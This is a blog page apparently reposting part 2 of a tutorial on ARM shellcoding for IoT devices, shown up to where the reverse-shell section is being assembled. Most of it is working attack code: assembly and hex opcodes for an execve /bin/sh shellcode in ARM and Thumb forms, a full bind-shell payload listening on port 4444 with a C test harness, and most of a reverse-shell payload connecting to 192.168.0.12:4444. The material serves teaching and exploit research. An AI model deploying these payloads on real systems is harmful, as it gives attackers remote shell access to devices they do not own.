<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>arm exploitation for iot ---episode 2 | 物联网安全技术研究</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  
  
  
  
  <meta name="description" content="Introduction Inpart 1 we’ve seen an introduction in reversing of some simple ARM applications, we’ve also seen how to set up the work environment and how to write ahello world (also with syscall). In">
<meta property="og:type" content="article">
<meta property="og:title" content="ARM exploitation for IoT ---Episode 2">
<meta property="og:url" content="http://yoursite.com/2017/11/10/ARM-exploitation-for-IoT-Episode-2/index.html">
<meta property="og:site_name" content="物联网安全技术研究">
<meta property="og:description" content="Introduction Inpart 1 we’ve seen an introduction in reversing of some simple ARM applications, we’ve also seen how to set up the work environment and how to write ahello world (also with syscall). In">
<meta property="og:locale" content="zh-CN">
<meta property="og:image" content="http://yoursite.com/2017/11/10/ARM-exploitation-for-IoT-Episode-2/0">
<meta property="og:image" content="http://yoursite.com/2017/11/10/ARM-exploitation-for-IoT-Episode-2/1">
<meta property="og:image" content="http://yoursite.com/2017/11/10/ARM-exploitation-for-IoT-Episode-2/2">
<meta property="og:image" content="http://yoursite.com/2017/11/10/ARM-exploitation-for-IoT-Episode-2/3">
<meta property="og:image" content="http://yoursite.com/2017/11/10/ARM-exploitation-for-IoT-Episode-2/4">
<meta property="og:image" content="http://yoursite.com/2017/11/10/ARM-exploitation-for-IoT-Episode-2/5">
<meta property="og:updated_time" content="2017-11-10T01:31:02.820Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="ARM exploitation for IoT ---Episode 2">
<meta name="twitter:description" content="Introduction Inpart 1 we’ve seen an introduction in reversing of some simple ARM applications, we’ve also seen how to set up the work environment and how to write ahello world (also with syscall). In">
<meta name="twitter:image" content="http://yoursite.com/2017/11/10/ARM-exploitation-for-IoT-Episode-2/0">
  
    <link rel="alternate" href="/atom.xml" title="物联网安全技术研究" type="application/atom+xml">
  
  <link rel="icon" href="/css/images/favicon.ico">
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  <link href="https://fonts.googleapis.com/css?family=Open+Sans|Montserrat:700" rel="stylesheet" type="text/css">
  <link href="https://fonts.googleapis.com/css?family=Roboto:400,300,300italic,400italic" rel="stylesheet" type="text/css">
  <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
  <style type="text/css">
    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/9749f0/00000000000000000001008f/27/l?subset_id=2&fvd=n5) format("woff2");font-weight:500;font-style:normal;}
    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/90cf9f/000000000000000000010091/27/l?subset_id=2&fvd=n7) format("woff2");font-weight:500;font-style:normal;}
    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/8a5494/000000000000000000013365/27/l?subset_id=2&fvd=n4) format("woff2");font-weight:lighter;font-style:normal;}
    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/d337d8/000000000000000000010095/27/l?subset_id=2&fvd=i4) format("woff2");font-weight:400;font-style:italic;}</style>
    
  <link rel="stylesheet" id="athemes-headings-fonts-css" href="//fonts.googleapis.com/css?family=Yanone+Kaffeesatz%3A200%2C300%2C400%2C700&amp;ver=4.6.1" type="text/css" media="all">
  <link rel="stylesheet" href="/css/style.css">

  <script src="/js/jquery-3.1.1.min.js"></script>

  <!-- Bootstrap core CSS -->
  <link rel="stylesheet" href="/css/bootstrap.css" >
  <link rel="stylesheet" href="/css/hiero.css" >
  <link rel="stylesheet" href="/css/glyphs.css" >
  

</head>

<script>
var themeMenus = {};

  themeMenus["/"] = "主页"; 

  themeMenus["/books"] = "书籍"; 

  themeMenus["/tools"] = "工具"; 

  themeMenus["/about"] = "关于"; 

</script>


  <body data-spy="scroll" data-target="#toc" data-offset="50">


  <header id="allheader" class="site-header" role="banner">
  <div class="clearfix container">
      <div class="site-branding">

          <h1 class="site-title">
            
              <a href="/" title="物联网安全技术研究" rel="home"> 物联网安全技术研究 </a>
            
          </h1>

          
            <div class="site-description">一个专注于物联网安全技术研究与交流的小站</div>
          
            
          <nav id="main-navigation" class="main-navigation" role="navigation">
            <a class="nav-open">Menu</a>
            <a class="nav-close">Close</a>
            <div class="clearfix sf-menu">

              <ul id="main-nav" class="nmenu sf-js-enabled">
                    
                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class="" href="/">主页</a> </li>
                    
                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class="" href="/books">书籍</a> </li>
                    
                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class="" href="/tools">工具</a> </li>
                    
                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class="" href="/about">关于</a> </li>
                    
              </ul>
            </div>
          </nav>


      </div>
  </div>
</header>


  <div id="container">
    <div id="wrap">
            
      <div id="content" class="outer">
        
          <section id="main" style="float:none;"><article id="post-ARM-exploitation-for-IoT-Episode-2"  class="article article-type-post" itemscope itemprop="blogPost" >
  <div id="articleInner" class="clearfix post-1016 post type-post status-publish format-standard has-post-thumbnail hentry category-template-2 category-uncategorized tag-codex tag-edge-case tag-featured-image tag-image tag-template">
    
    
      <header class="article-header">
        
  
    <h1 class="thumb" class="article-title" itemprop="name">
      ARM exploitation for IoT ---Episode 2
    </h1>
  

      </header>
    
    <div class="article-meta">
      
	Posted on <a href="/2017/11/10/ARM-exploitation-for-IoT-Episode-2/" class="article-date">
	  <time datetime="2017-11-10T00:35:16.000Z" itemprop="datePublished">十一月 10, 2017</time>
	</a>

      
	<span id="busuanzi_container_page_pv">
	  本文总阅读量<span id="busuanzi_value_page_pv"></span>次
	</span>

    </div>
    <div class="article-entry" itemprop="articleBody">
      
        <a id="more"></a>
<p>Introduction</p>
<p>In<a href="https://quequero.org/2017/07/arm-exploitation-iot-episode-1/" target="_blank" rel="external">part 1</a><br> we’ve seen an introduction in reversing of some simple ARM applications, we’ve also seen how to set up the work environment and how to write a<br>hello world<br> (also with syscall).</p>
<p>In this episode we will use the same work environment.</p>
<p>ARM shellcoding</p>
<p>We will see some basic shellcode:</p>
<p>Shell spawning shellcode</p>
<p>Bind TCP shellcode</p>
<p>Reverse shell shellcode</p>
<p>Load and execute a shell from memory</p>
<p>Encode the shellcode</p>
<p>Shell spawning shellcode</p>
<p>In this section we will see how spawning a shell using the<br>execve<br> syscall for the execution of the<br> /bin/sh<br> program.</p>
<p>The main steps to follow are really easy, we have just to:</p>
<p>Find the execve system call number</p>
<p>Fill the argument of the execve syscall</p>
<p>1- Find the execve system call number</p>
<p><a href="/cdn-cgi/l/email-protection">[email protected]</a><br>:/home/pi/arm/episode2# cat /usr/include/arm-linux-gnueabihf/asm/unistd.h | grep execve</p>
<p>#define <strong>NR_execve (</strong>NR_SYSCALL_BASE+ 11)</p>
<p>Then the syscall number is<br>11</p>
<p>2- Fill the argument of the execve syscall</p>
<p>int execve(const char <em>filename, char </em>const argv[],char *const envp[]);<br>r0 = /bin/sh/<br>r1 = [address of /bin/sh, 0x00]<br>r2 = 0</p>
<p>So we can write the execve with their respective arguments:</p>
<p>execve(“/bin/sh”, [“/bin/sh”, 0], 0)</p>
<p>We have all to write the complete file:<br><a href="https://github.com/invictus1306/ARM-episodes/blob/master/Episode2/execve.s" target="_blank" rel="external">execve.s</a></p>
<p>.text<br>.global _start<br>_start:<br>  @ execve(“/bin/sh”,[“/bin/sh”, 0], 0)</p>
<p>  mov r0, pc<br>  add r0, #32<br>  sub r2, r2, r2<br>  push {r0, r2}<br>  mov r1, sp<br>  mov r7, #11<br>  swi #0<br>_exit:<br>  mov r0, #0<br>  mov r7, #1<br>  swi #0 @ exit<br>shell: .asciz “/bin/sh”</p>
<p>Assemble and link it</p>
<p><a href="/cdn-cgi/l/email-protection">[email protected]</a><br>:/home/pi/arm/episode2# as -o execve.o execve.s</p>
<p><a href="/cdn-cgi/l/email-protection">[email protected]</a><br>:/home/pi/arm/episode2# ld -o execve execve.o</p>
<p><a href="/cdn-cgi/l/email-protection">[email protected]</a><br>:/home/pi/arm/episode2# ./execve</p>
<h1 id="pwd"><a href="#pwd" class="headerlink" title="pwd"></a>pwd</h1><p>/home/pi/arm/episode2</p>
<p>Extract the opcode</p>
<p>for i in $(objdump -d execve | grep “^ “|awk -F”[\t]” ‘{print $2}’); do echo -n ${i:6:2}${i:4:2}${i:2:2}${i:0:2};done| sed ‘s/.{2}/\x&amp;/g’<br>\x0f\x00\xa0\xe1\x20\x00\x80\xe2\x02\x20\x42\xe0\x05\x00\x2d\xe9\x0d\x10\xa0\xe1\x0b\x70\xa0\xe3\x00\x00\x00\xef\x00\x00\xa0\xe3\x01\x70\xa0\xe3\x00\x00\x00\xef\x2f\x62\x69\x6e\x2f\x73\x68\x00</p>
<p>Test it (file:<br><a href="https://github.com/invictus1306/ARM-episodes/blob/master/Episode2/test/test_execve.c" target="_blank" rel="external">test_execve.c</a><br>)</p>
<p>#include <stdio.h><br>char <em>code= “\x0f\x00\xa0\xe1\x20\x00\x80\xe2\x02\x20\x42\xe0\x05\x00\x2d\xe9\x0d\x10\xa0\xe1\x0b\x70\xa0\xe3\x00\x00\x00\xef\x00\x00\xa0\xe3\x01\x70\xa0\xe3\x00\x00\x00\xef\x2f\x62\x69\x6e\x2f\x73\x68\x00”;<br>int main(void) {<br>  (</em>(void(*)()) code)();<br>  return 0;<br>}</stdio.h></p>
<p>Compile and execute it</p>
<p><a href="/cdn-cgi/l/email-protection">[email protected]</a><br>:/home/pi/arm/episode2# gcc -o test_execve test_execve.c</p>
<p><a href="/cdn-cgi/l/email-protection">[email protected]</a><br>:/home/pi/arm/episode2# ./test_execve</p>
<h1 id="pwd-1"><a href="#pwd-1" class="headerlink" title="pwd"></a>pwd</h1><p>/home/pi/arm/episode2</p>
<p>Thumb consideration</p>
<p>Thumb consists of a subset of 32 bit ARM instructions into a 16 bit instruction set. Thumb should only be used for memory constrained environments, because it usually has higher performances than normal ARM code on a processor with a 16 bit data bus, but lower performances on a processor with a 32 bit data bus.</p>
<p>There are different methods to<br>enter<br> and<br>leave<br> the thumb state, in the following example we will see one of the most used methods, it consists in turning on the least-significant bit of the program counter and call the BX (Branch and Exchange) instruction.</p>
<p>Thumb version for the execve shellcode</p>
<p>This is the source code for the new execve shellcode in Thumb mode (file:<br><a href="https://github.com/invictus1306/ARM-episodes/blob/master/Episode2/execveT.s" target="_blank" rel="external">execveT.s</a><br>)</p>
<p>.text<br>.global _start<br>_start:<br>  @ execve(“/bin/sh”,[“/bin/sh”, 0], 0)<br>  .code 32<br>  add r6, pc, #1  @ turn on the least-significant bit of the program counter<br>  bx r6           @ Branch and Exchange<br>  .code 16<br>  mov r0, pc<br>  add r0, #16<br>  sub r2, r2, r2<br>  push {r0, r2}<br>  mov r1, sp<br>  mov r7, #11<br>  swi #0<br>_exit:<br>  mov r0, #0<br>  mov r7, #1<br>  swi #0          @ exit(0)<br>.asciz “/bin/sh”</p>
<p>Assemble, link and execute the program</p>
<p><a href="/cdn-cgi/l/email-protection">[email protected]</a><br>:/home/pi/arm/episode2# as -o execveT.o execveT.s</p>
<p><a href="/cdn-cgi/l/email-protection">[email protected]</a><br>:/home/pi/arm/episode2# ld -o execveT execveT.o</p>
<p><a href="/cdn-cgi/l/email-protection">[email protected]</a><br>:/home/pi/arm/episode2# ./execveT</p>
<h1 id="pwd-2"><a href="#pwd-2" class="headerlink" title="pwd"></a>pwd</h1><p>/home/pi/arm/episode2</p>
<p>Extract the opcodes</p>
<p>for i in $(objdump -d execveT | grep “^ “|awk -F”[\t]” ‘{print $2}’); do echo -n ${i:6:2}${i:4:2}${i:2:2}${i:0:2};done| sed ‘s/.{2}/\x&amp;/g’<br>\x01\x60\x8f\xe2\x16\xff\x2f\xe1\x78\x46\x10\x30\x92\x1a\x05\xb4\x69\x46\x0b\x27\x00\xdf\x00\x20\x01\x27\x00\xdf\x2f\x62\x69\x6e\x2f\x73\x68\x00</p>
<p>As expected the size of the shellcode is smaller than the previous ARM shellcode, let’s test it (file:<br><a href="https://github.com/invictus1306/ARM-episodes/blob/master/Episode2/test/test_execveT.c" target="_blank" rel="external">test_execveT.c</a><br>)</p>
<p>#include <stdio.h><br>char <em>code= “\x01\x60\x8f\xe2\x16\xff\x2f\xe1\x78\x46\x10\x30\x92\x1a\x05\xb4\x69\x46\x0b\x27\x00\xdf\x00\x20\x01\x27\x00\xdf\x2f\x62\x69\x6e\x2f\x73\x68\x00”;<br>int main(void) {<br>  (</em>(void(*)()) code)();<br>  return 0;<br>}</stdio.h></p>
<p>Compile and execute the program</p>
<p><a href="/cdn-cgi/l/email-protection">[email protected]</a><br>:/home/pi/arm/episode2# gcc -o test_execveT test_execveT.c</p>
<p><a href="/cdn-cgi/l/email-protection">[email protected]</a><br>:/home/pi/arm/episode2# ./test_execveT</p>
<h1 id="pwd-3"><a href="#pwd-3" class="headerlink" title="pwd"></a>pwd</h1><p>/home/pi/arm/episode2</p>
<p>B<br>ind<br>TCP<br>shellcode</p>
<p>In this section we will see a TCP port binding shellcode, the purpose here is to bind the shell to a network port that listens for incoming connections.</p>
<p>The steps to do in this case are:</p>
<p>Create a socket (TCP)</p>
<p>Bind the created socket to an address/port</p>
<p>Use syscall<br>listen<br> for incoming connections</p>
<p>Use syscall<br>accept</p>
<p>Use<br>dup2<br> syscall to redirect stdin, stdout and stderr</p>
<p>Use the execve syscall</p>
<p>1- Create a socket (TCP)</p>
<p>Get syscall number for socket syscall</p>
<p><a href="/cdn-cgi/l/email-protection">[email protected]</a><br>:/home/pi/arm/episode2# cat /usr/include/arm-linux-gnueabihf/asm/unistd.h | grep socket</p>
<p>#define <strong>NR_socketcall (</strong>NR_SYSCALL_BASE+102)</p>
<p>#define <strong>NR_socket (</strong>NR_SYSCALL_BASE+281)</p>
<p>#define <strong>NR_socketpair (</strong>NR_SYSCALL_BASE+288)</p>
<p>#undef __NR_socketcall</p>
<p>As you can see from the above output, it is not possible to make use of the<br>socketcall<br> syscall, but we can use directly the socket<br>syscall<br> :). Let’s look at how to call the socket<br>syscall<br> with its respective parameters</p>
<p>@ sockfd = socket(int socket_family, int socket_type, int protocol);</p>
<p>mov r0, #2    @ PF_INET = 2</p>
<p>mov r1, #1    @ SOCK_STREAM = 1</p>
<p>mov r2, #0    @ IPPROTO_IP = 0</p>
<p>ldr r7, =#281 @ socket syscall</p>
<p>swi 0</p>
<p>@ r0 contains the fd returned by the syscall</p>
<p>mov r6, r0    @ save the file descriptor into r6</p>
<p>2- Bind the created socket to an address/port</p>
<p>We have to bind the file descriptor (saved into<br>r6<br>) to an address/port, in order to do it we must use the<br>bind<br> syscall</p>
<p><a href="/cdn-cgi/l/email-protection">[email protected]</a><br>:/home/pi/arm/episode2# cat /usr/include/arm-linux-gnueabihf/asm/unistd.h | grep bind</p>
<p>#define <strong>NR_bind (</strong>NR_SYSCALL_BASE+282)</p>
<p>#define <strong>NR_mbind (</strong>NR_SYSCALL_BASE+319)</p>
<p>We have the syscall number, now let’s look at the parameters of the bind syscall</p>
<p>@ int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);</p>
<p>This is the definition of the struct of the second argument</p>
<p>struct sockaddr_in {</p>
<p>  __kernel_sa_family_t sin_family; /<em> Address family </em>/</p>
<p>  __be16 sin_port; /<em> Port number </em>/</p>
<p>struct in_addr sin_addr; /<em> Internet address </em>/</p>
<p>};</p>
<p>In our case we have</p>
<p>sin_addr=0<br>sin_port=4444<br>sin_family=AF_INET (0x2)</p>
<p>We have everything we need to write the code</p>
<p>mov r1, #0x5C           @ r1=0x5c<br>mov r5, #0x11           @ r5=0x11<br>mov r1, r1, lsl #24     @ r1=0x5c000000<br>add r1, r1, r5, lsl #16 @ r1=0x5c110000 - port number=4444(0x115C)<br>add r1, #2              @ r1=0x5c110002 - sin_family+sin_port<br>sub r2, r2, r2          @ sin_addr<br>push {r1, r2}           @ push into the stack r1 and r2<br>mov r1, sp              @ save pointer to sockaddr_in struct<br>mov r2, #0x10           @ addrlen<br>mov r0, r6              @ mov sockfd into r0<br>ldr r7, =#282           @ bind syscall number<br>swi 0</p>
<p>3- use syscall listen for incoming connections</p>
<p>Look at the number of the<br>listen<br> syscall</p>
<p><a href="/cdn-cgi/l/email-protection">[email protected]</a><br>:/home/pi/arm/episode2# cat /usr/include/arm-linux-gnueabihf/asm/unistd.h | grep listen</p>
<p>#define <strong>NR_listen (</strong>NR_SYSCALL_BASE+284)</p>
<p>Let’s look at the parameters of the<br>listen<br> syscall and fill them</p>
<p>@ int listen(int sockfd, int backlog);<br>mov r0, r6    @ mov sockfd into r0<br>mov r1, #1    @ backlog=1<br>ldr r7, =#284 @ listen syscall<br>swi 0</p>
<p>4- Use syscall accept</p>
<p>Look at the number of the<br>accept<br> syscall</p>
<p><a href="/cdn-cgi/l/email-protection">[email protected]</a><br>:/home/pi/arm/episode2# cat /usr/include/arm-linux-gnueabihf/asm/unistd.h | grep accept</p>
<p>#define <strong>NR_accept (</strong>NR_SYSCALL_BASE+285)</p>
<p>#define <strong>NR_accept4 (</strong>NR_SYSCALL_BASE+366)</p>
<p>Let’s look at the parameters of the<br>accept<br> syscall and fill them</p>
<p>@ int accept(int sockfd, struct sockaddr <em>addr, socklen_t </em>addrlen)<br>mov r0, r6     @ mov sockfd into r0<br>sub r1, r1, r1 @ addr=0<br>sub r2, r2, r2 @ addrlen=0<br>ldr r7, =#285<br>swi 0</p>
<p>5- Use<br>dup2<br> syscall to redirect stdin, stdout and stderr</p>
<p>Look at the number of the accept syscall</p>
<p><a href="/cdn-cgi/l/email-protection">[email protected]</a><br>:/home/pi/arm/episode2# cat /usr/include/arm-linux-gnueabihf/asm/unistd.h | grep dup2</p>
<p>#define <strong>NR_dup2 (</strong>NR_SYSCALL_BASE+ 63)</p>
<p>Let’s look at the parameters of the<br>dup2<br> syscall and fill them</p>
<p>@ Redirect stdin, stdout and stderr via dup2<br>mov r1, #2       @ counter stdin(0), stdout(1) and stderr(2)<br>loop:<br>  mov r7, #63    @ dup2 syscall<br>  swi 0<br>  sub r1, r1, #1 @ decrement counter<br>  cmp r1, #-1    @ compare r1 with -1<br>  bne loop       @ if the result is not equal jmp to loop</p>
<p>6- use the<br>execve<br> syscall</p>
<p>We use the same code we used in the “<br>Shell spawning shellcode”<br> section for the<br>execve<br> syscall</p>
<p>@ int execve(const char <em>filename, char </em>const argv[],char *const envp[]);<br>mov r0, pc<br>add r0, #32<br>sub r2, r2, r2<br>push {r0, r2}<br>mov r1, sp<br>mov r7, #11<br>swi 0<br>_exit:<br>  mov r0, #0<br>  mov r7, #1<br>  swi 0 @ exit(0)</p>
<p>.asciz “/bin/sh”</p>
<p>This is the code of the complete shellcode (file:<br><a href="https://github.com/invictus1306/ARM-episodes/blob/master/Episode2/bind.s" target="_blank" rel="external">bind.s</a><br>)</p>
<p>@.syntax unified<br>.global _start<br>_start:</p>
<p>  @ sockfd = socket(int socket_family, int socket_type, int protocol);<br>  mov r0, #2    @ PF_INET = 2<br>  mov r1, #1    @ SOCK_STREAM = 1<br>  mov r2, #0    @ IPPROTO_IP = 0<br>  ldr r7, =#281 @ socketcall<br>  swi 0</p>
<p>  @ r0 contains the fd returned by the syscall<br>  mov r6, r0 @ file descriptor</p>
<p>  @ bind the file descriptor to an address/port<br>  @ int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);</p>
<p>  @struct sockaddr_in {<br>    @ <strong>kernel_sa_family_t sin_family; /<em> Address family </em>/<br>    @ </strong>be16 sin_port; /<em> Port number </em>/<br>    @ struct in_addr sin_addr; /<em> Internet address </em>/<br>  @};</p>
<p>  @sin_addr=0<br>  @sin_port=4444<br>  @sin_family=AF_INET</p>
<p>  mov r1, #0x5C           @ r1=0x5c<br>  mov r5, #0x11           @ r5=0x11<br>  mov r1, r1, lsl #24     @ r1=0x5c000000<br>  add r1, r1, r5, lsl #16 @ r1=0x5c110000 - port number=4444(0x115C)<br>  add r1, #2              @ r1=0x5c110002 - sin_family+sin_port<br>  sub r2, r2, r2          @ sin_addr<br>  push {r1, r2}           @ push into the stack r1 and r2<br>  mov r1, sp              @ save pointer to sockaddr_in struct<br>  mov r2, #0x10           @ addrlen<br>  mov r0, r6              @ mov sockfd into r0<br>  ldr r7, =#282           @ bind syscall<br>  swi 0</p>
<p>  @ listen for incoming connections via SYS_LISTEN<br>  @ int listen(int sockfd, int backlog);</p>
<p>  mov r0, r6    @ mov sockfd into r0<br>  mov r1, #1    @ backlog=1<br>  ldr r7, =#284 @ listen syscall<br>  swi 0</p>
<p>  @ Accept connections<br>  @ int accept(int sockfd, struct sockaddr <em>addr, socklen_t </em>addrlen)</p>
<p>  mov r0, r6     @ mov sockfd into r0<br>  sub r1, r1, r1 @ addr=0<br>  sub r2, r2, r2 @ addrlen=0<br>  ldr r7, =#285  @ accept syscall<br>  swi 0</p>
<p>  @ Redirect stdin, stdout and stderr via dup2</p>
<p>  mov r1, #2       @ counter stdin(0), stdout(1) and stderr(2)<br>  loop:<br>    mov r7, #63    @ dup2 syscall<br>    swi 0<br>    sub r1, r1, #1 @ decrement counter<br>    cmp r1, #-1    @ compare r1 with -1<br>    bne loop       @ if the result is not equal jmp to loop</p>
<p>  @ int execve(const char <em>filename, char </em>const argv[],char *const envp[]);<br>  mov r0, pc<br>  add r0, #32<br>  sub r2, r2, r2<br>  push {r0, r2}<br>  mov r1, sp<br>  mov r7, #11<br>  swi 0</p>
<p>_exit:<br>  mov r0, #0<br>  mov r7, #1<br>  swi 0  @ exit(0)</p>
<p>.asciz “/bin/sh”</p>
<p>Assemble and link the program</p>
<p><a href="/cdn-cgi/l/email-protection">[email protected]</a><br>:/home/pi/arm/episode2# as -o bind.o bind.s</p>
<p><a href="/cdn-cgi/l/email-protection">[email protected]</a><br>:/home/pi/arm/episode2# ld -o bind bind.o</p>
<p>Test it</p>
<p><a href="/cdn-cgi/l/email-protection">[email protected]</a><br>:/home/pi/arm/episode2# ./bind</p>
<p><a href="/cdn-cgi/l/email-protection">[email protected]</a><br>:/home/pi/arm/episode2# netstat -anpt | grep bind<br>tcp 0 0 0.0.0.0:4444 0.0.0.0:* LISTEN 15008/bind</p>
<p>Extract the opcode</p>
<p>for i in $(objdump -d bind | grep “^ “|awk -F”[\t]” ‘{print $2}’); do echo -n ${i:6:2}${i:4:2}${i:2:2}${i:0:2};done| sed ‘s/.{2}/\x&amp;/g’</p>
<p>\x02\x00\xa0\xe3\x01\x10\xa0\xe3\x00\x20\xa0\xe3\xa0\x70\x9f\xe5\x00\x00\x00\xef\x00\x60\xa0\xe1\x5c\x10\xa0\xe3\x11\x50\xa0\xe3\x01\x1c\xa0\xe1\x05\x18\x81\xe0\x02\x10\x81\xe2\x02\x20\x42\xe0\x06\x00\x2d\xe9\x0d\x10\xa0\xe1\x10\x20\xa0\xe3\x06\x00\xa0\xe1\x70\x70\x9f\xe5\x00\x00\x00\xef\x06\x00\xa0\xe1\x01\x10\xa0\xe3\x47\x7f\xa0\xe3\x00\x00\x00\xef\x06\x00\xa0\xe1\x01\x10\x41\xe0\x02\x20\x42\xe0\x50\x70\x9f\xe5\x00\x00\x00\xef\x02\x10\xa0\xe3\x3f\x70\xa0\xe3\x00\x00\x00\xef\x01\x10\x41\xe2\x01\x00\x71\xe3\xfa\xff\xff\x1a\x0f\x00\xa0\xe1\x20\x00\x80\xe2\x02\x20\x42\xe0\x05\x00\x2d\xe9\x0d\x10\xa0\xe1\x0b\x70\xa0\xe3\x00\x00\x00\xef\x00\x00\xa0\xe3\x01\x70\xa0\xe3\x00\x00\x00\xef\x2f\x62\x69\x6e\x2f\x73\x68\x00\x19\x01\x00\x00\x1a\x01\x00\x00\x1d\x01\x00\x00</p>
<p>Test it (file:<br><a href="https://github.com/invictus1306/ARM-episodes/blob/master/Episode2/test/test_bind.c" target="_blank" rel="external">test_bind.c</a><br>)</p>
<p>#include <stdio.h></stdio.h></p>
<p>char *code=”\x02\x00\xa0\xe3\x01\x10\xa0\xe3\x00\x20\xa0\xe3\xa0\x70\x9f\xe5\x00\x00\x00\xef\x00\x60\xa0\xe1\x5c\x10\xa0\xe3\x11\x50\xa0\xe3\x01\x1c\xa0\xe1\x05\x18\x81\xe0\x02\x10\x81\xe2\x02\x20\x42\xe0\x06\x00\x2d\xe9\x0d\x10\xa0\xe1\x10\x20\xa0\xe3\x06\x00\xa0\xe1\x70\x70\x9f\xe5\x00\x00\x00\xef\x06\x00\xa0\xe1\x01\x10\xa0\xe3\x47\x7f\xa0\xe3\x00\x00\x00\xef\x06\x00\xa0\xe1\x01\x10\x41\xe0\x02\x20\x42\xe0\x50\x70\x9f\xe5\x00\x00\x00\xef\x02\x10\xa0\xe3\x3f\x70\xa0\xe3\x00\x00\x00\xef\x01\x10\x41\xe2\x01\x00\x71\xe3\xfa\xff\xff\x1a\x0f\x00\xa0\xe1\x20\x00\x80\xe2\x02\x20\x42\xe0\x05\x00\x2d\xe9\x0d\x10\xa0\xe1\x0b\x70\xa0\xe3\x00\x00\x00\xef\x00\x00\xa0\xe3\x01\x70\xa0\xe3\x00\x00\x00\xef\x2f\x62\x69\x6e\x2f\x73\x68\x00\x19\x01\x00\x00\x1a\x01\x00\x00\x1d\x01\x00\x00”;</p>
<p>int main(void) {</p>
<p>  (<em>(void(</em>)()) code)();</p>
<p>  return 0;</p>
<p>}</p>
<p>Compile it</p>
<p><a href="/cdn-cgi/l/email-protection">[email protected]</a><br>:/home/pi/arm/episode2# gcc -o test_bind test_bind.c</p>
<p>Test it</p>
<p><img src="/2017/11/10/ARM-exploitation-for-IoT-Episode-2/0" alt=""></p>
<p>Reverse shell shellcode</p>
<p>In this<br>section<br> we will see<br>a TCP reverse shell shellcode. The purpose is to open a shell that reverse connects to a configured IP and port and executes a shell.</p>
<p>The steps to follow are:</p>
<p>Create a socket</p>
<p>Connect to a IP/port</p>
<p>Redirect stdin, stdout and stderr via<br>dup2</p>
<p>Execve a /bin/sh</p>
<p>1- Create a TCP socket</p>
<p>In the previous chapter we have seen that the socket syscall number is<br>281<br>.</p>
<p>Proceed with the filling of the parameters</p>
<p>@ sockfd = socket(int socket_family, int socket_type, int protocol);</p>
<p>mov r0, #2    @ PF_INET = 2<br>mov r1, #1    @ SOCK_STREAM = 1<br>mov r2, #0    @ IPPROTO_IP = 0<br>ldr r7, =#281 @ socketcall<br>swi 0</p>
<p>@ r0 contains the fd returned by the syscall</p>
<p>mov r6, r0 @ file descriptor</p>
<p>2- Connect to a IP/port</p>
<p>Look at the number of the<br>connect<br> syscall</p>
<p><a href="/cdn-cgi/l/email-protection">[email protected]</a><br>:/home/pi/arm/episode2# cat /usr/include/arm-linux-gnueabihf/asm/unistd.h | grep connect</p>
<p>#define <strong>NR_connect (</strong>NR_SYSCALL_BASE+283)</p>
<p>Let’s look at the parameters of the<br>connect<br> syscall and fill them</p>
<p>@ int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);</p>
<p>struct sockaddr_in {</p>
<p>  __kernel_sa_family_t sin_family; /<em> Address family </em>/</p>
<p>  __be16 sin_port; /<em> Port number </em>/</p>
<p>  struct in_addr sin_addr; /<em> Internet address </em>/</p>
<p>};</p>
<p>sin_addr=192.168.0.12</p>
<p>sin_port=4444</p>
<p>sin_family=AF_INET</p>
<p>We have everything we need to write the code</p>
<p>mov r1, #0x5C           @ r1=0x5c</p>
<p>mov r5, #0x11           @ r5=0x11</p>
<p>mov r1, r1, lsl #24     @ r1=0x5c000000</p>
<p>add r1, r1, r5, lsl #16 @ r1=0x5c110000 - port number=4444(0x115C)</p>
<p>add r1, #2              @ r1=0x5c110002 - sin_family+sin_port</p>
<p>ldr r2, =#0x0c00a8c0    @ sin_addr=192.168.0.12 each octet is represented by one byte</p>
<p>push {r1, r2}           @ push into the stack r1 and r2</p>
<p>mov r1, sp              @ save pointer to sockaddr_in struct</p>
<p>mov r2, #0x10           @ addrlen</p>
<p>mov r0, r6              @ mov sockfd into r0</p>
<p>ldr r7, =#283           @ connect syscall</p>
<p>swi 0</p>
<p>3- Redirect stdin, stdout and stderr via<br>dup2</p>
<p>We have seen that the dup2 syscall number is<br>63</p>
<p>Let’s look at the parameters of the<br>dup2<br> syscall and fill them</p>
<p>@ Redirect stdin, stdout and stderr via dup2</p>
<p>mov r1, #2       @ counter stdin(0), stdout(1) and stderr(2)</p>
<p>loop:</p>
<p>  mov r0, r6     @ mov sockfd into r0</p>
<p>  mov r7, #63    @ dup2 syscall</p>
<p>  swi 0</p>
<p>  sub r1, r1, #1 @ decrement counter</p>
<p>  cmp r1, #-1    @ compare r1 with -1</p>
<p>  bne loop       @ if the result is not equal jmp to loop</p>
<p>4- Execve a /bin/sh</p>
<p>We use the same code we used in the “<br>Shell spawning shellcode”<br> section for the<br>execve<br> syscall</p>
<p>@ int execve(const char <em>filename, char </em>const argv[],char *const envp[]);</p>
<p>mov r0, pc</p>
<p>add r0, #32</p>
<p>sub r2, r2, r2</p>
<p>push {r0, r2}</p>
<p>mov r1, sp</p>
<p>mov r7, #11</p>
<p>swi 0</p>
<p>_exit:</p>
<p>  mov r0, #0</p>
<p>  mov r7, #1</p>
<p>  swi 0 @ exit(0)</p>
<p>shell: .asciz “/bin/sh”</p>
<p>Assemble and link the program<br><a href="https://github.com/invictus1306/ARM-episodes/blob/master/Episode2/reverse_shell.s" target="_blank" rel="external">reverse_shell.s</a></p>
<p><a href="/cdn-cgi/l/email-protection">[email protected]</a><br>:/home/pi/arm/chapter3# as -o reverse_shell.o reverse_shell.s</p>
